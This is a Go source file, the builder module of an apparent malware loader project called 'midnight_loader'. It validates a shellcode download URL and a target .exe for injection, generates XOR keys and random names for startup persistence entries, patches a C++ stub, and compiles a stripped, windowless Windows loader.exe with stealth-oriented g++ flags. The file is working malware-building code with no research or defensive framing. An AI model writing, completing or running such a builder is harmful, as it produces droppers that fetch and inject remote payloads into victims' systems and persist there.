package builder

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"midnight_loader/internal/config"
)

const gppFlags = "-w -O3 -std=c++17 -masm=intel -static -fno-stack-protector " +
	"-fno-threadsafe-statics -fvisibility=hidden -fdata-sections -ffunction-sections " +
	"-fno-exceptions -mwindows -s -Wl,--gc-sections -flto -pipe " +
	"-lwininet -lpsapi -lntdll -ladvapi32"

// ExistsOnPath reports whether cmd is available on PATH.
func ExistsOnPath(cmd string) bool {
	_, err := exec.LookPath(cmd)
	return err == nil
}

// Build validates cfg, patches the stub, compiles it with g++, and writes
// loader.exe to cfg.OutputPath. logFn receives each progress line.
func Build(ctx context.Context, cfg config.BuildConfig, logFn func(string)) error {
	if !strings.HasPrefix(cfg.ShellcodeURL, "http") {
		return fmt.Errorf("shellcode_url must start with http")
	}
	if !strings.HasSuffix(strings.ToLower(cfg.InjectionTarget), ".exe") {
		return fmt.Errorf("injection_target must end with .exe")
	}

	if cfg.XorKey == "" {
		cfg.XorKey = GenerateKey()
		logFn(fmt.Sprintf("[*] xor key: %s", cfg.XorKey))
	}
	if cfg.StartupEntryName == "" {
		cfg.StartupEntryName = GenerateKey()
	}
	if cfg.DirectoryName == "" {
		cfg.DirectoryName = GenerateKey()
	}
	if cfg.FileName == "" {
		cfg.FileName = GenerateKey()
	}

	tmpDir, err := os.MkdirTemp("", "mlbuild-")
	if err != nil {
		return fmt.Errorf("mktemp: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	logFn("[*] patching stub...")
	cppPath, err := PatchStub(cfg, tmpDir)
	if err != nil {
		return fmt.Errorf("patch stub: %w", err)
	}

	outExe := filepath.Join(tmpDir, "loader.exe")
	args := append(strings.Fields(gppFlags), cppPath, "-o", outExe)
	cmd := exec.CommandContext(ctx, "g++", args...)
	cmd.Dir = tmpDir

	logFn("[*] compiling...")
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("stderr pipe: %w", err)
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start g++: %w", err)
	}
	sc := bufio.NewScanner(stderr)
	for sc.Scan() {
		logFn("[g++] " + sc.Text())
	}
	if err := cmd.Wait(); err != nil {
		return fmt.Errorf("compile failed: %w", err)
	}

	dest := filepath.Join(cfg.OutputPath, "loader.exe")
	logFn(fmt.Sprintf("[*] writing %s", dest))
	data, err := os.ReadFile(outExe)
	if err != nil {
		return fmt.Errorf("read compiled output: %w", err)
	}
	if err := os.WriteFile(dest, data, 0755); err != nil {
		return fmt.Errorf("write output: %w", err)
	}
	logFn("[+] build complete")
	return nil
}
